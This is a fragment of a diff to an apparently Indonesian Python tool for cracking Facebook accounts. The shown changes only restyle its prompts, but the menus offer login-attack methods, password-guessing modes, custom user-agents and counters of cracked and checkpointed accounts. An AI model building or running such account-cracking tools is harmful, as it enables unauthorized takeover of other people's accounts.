 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/]. [bold cyan]Metode Mobile  [bold white][[bold green]Slow[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/]. [bold cyan]Metode Mbasic [bold white][[bold green]Slow[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/]. [bold cyan]Metode Free [bold white][[bold green]Very Slow[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/]. [bold cyan]Metode B-Api [bold white][[bold green]Very Fast[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/]. [bold cyan]Metode Async [bold white][[bold green]Very Slow[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/]. [bold cyan]Metode Reguler [bold white][[bold green]Slow[bold white]][/]',width=90,title=f"[bold red][[bold green] Setting Metode [bold red]]",style=f"bold red"))
-	hc = input(f' {P}[{H}+{P}] \33[1;96mPilih Metode :{P} ')
+	hc = input(f' {P}[{H}+{P}] \33[1;96mPilih Metode \x1b[1;91m>{P} ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -1607,20 +1607,20 @@ def setting():
 	cetak(panel('''[bold white][[bold green]01[bold white]]. [bold cyan]Password Random[bold white] [[bold green]Good[bold white]]
 [bold white][[bold green]02[bold white]]. [bold cyan]Password Otomatis [bold white][[bold green]Very Good[bold white]]
 [bold white][[bold green]03[bold white]]. [bold cyan]Password Manual [bold white][[bold red]Not Good[bold white]]''',width=90,title=f"[bold red][[bold green] Setting Password[bold red]]",style=f"bold red"))
-	pwplus=input(f' {P}[{H}+{P}]\33[1;96m Pilih sandi :{P} ')
+	pwplus=input(f' {P}[{H}+{P}]\33[1;96m Pilih sandi \x1b[1;91m>{P} ')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
-		pwku=input(f' {P}[{H}+{P}]\33[1;96m Sandi : {P}')
+		pwku=input(f' {P}[{H}+{P}]\33[1;96m Sandi \x1b[1;91m> {P}')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
 	
-	uatambah = input(f' {P}[{H}+{P}] \33[1;96mApakah Anda Ingin Mengunakan User-Agent Manual Di Script Y/T :{P} ')
+	uatambah = input(f' {P}[{H}+{P}] \33[1;96mApakah Anda Ingin Mengunakan User-Agent Manual Di Script Y/T \x1b[1;91m>{P} ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
-		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukan User-Agent :{P} ')
+		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukan User-Agent \x1b[1;91m>{P} ')
 		cetak(panel(f'[bold cyan] Anda Akan Mengunakan User-Agent Anda Sendiri Untuk Melakukan Crack Account Facebook ',width=90,title=f"[bold red][[bold green] info u-a [bold red]]",style=f"bold red"));time.sleep(0.05)
 		ualu.append(bzer)
 	elif uatambah in ['T','TIDAK','tidak','t']:
@@ -1700,7 +1700,7 @@ def passwrd():
 	print(f'{x}  [{h}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('')
-	xyzondsini = input('\x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;93m \x1b[1;96mApakah Anda Ingin Crack Facebook Lagi Y/T : \x1b[1;93m')
+	xyzondsini = input('\x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;93m \x1b[1;96mApakah Anda Ingin Crack Facebook Lagi Y/T \x1b[1;91m> \x1b[1;97m')
 	if xyzondsini in ['y','Y']:
 		back()
 	else:
